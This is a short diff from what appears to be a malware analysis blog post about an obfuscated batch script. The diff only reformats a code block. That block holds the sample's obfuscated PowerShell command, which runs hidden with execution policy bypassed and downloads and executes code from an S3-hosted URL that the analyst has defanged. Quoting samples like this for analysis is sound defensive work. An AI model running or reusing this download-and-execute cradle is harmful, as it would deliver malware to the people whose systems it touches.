@@ -17,11 +17,9 @@ This is a fairly simple batch script which contains a lot of garbage Japanese st
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7f365d8e-b5b4-46ea-a4bb-f99579f74a2b)
 
-<section>
-  <pre><code class="language-powershell">
+```powershell
 C^M^D.%rHX%X%rHX% /C P^OW%rHX%RSH%rHX%LL.%rHX%X%rHX% -N^O^P -WI^N^D HIDD%rHX%N -%rHX%X%rHX%C B^YPA^SS -NO^NI [BYT%rHX%[]];$vjpi='I%rHX%X(N%rHX%W-OBJ%rHX%CT N%rHX%T.W';$Jzzm='%rHX%BCLI%rHX%NT).DOWNLO';[BYT%rHX%[]];$AYeD='TUUL(''hxxps[://]buckotx.s3.amazonaws[.]com/x.png'')'.R%rHX%PLAC%rHX%('TUUL','ADSTRING');[BYT%rHX%[]];I%rHX%X($vjpi+$Jzzm+$AYeD)
-  </code></pre>
-</section>
+```
 
 
 If we set the variable and add an "echo" to before the command line, we are able to deobfuscate the string.
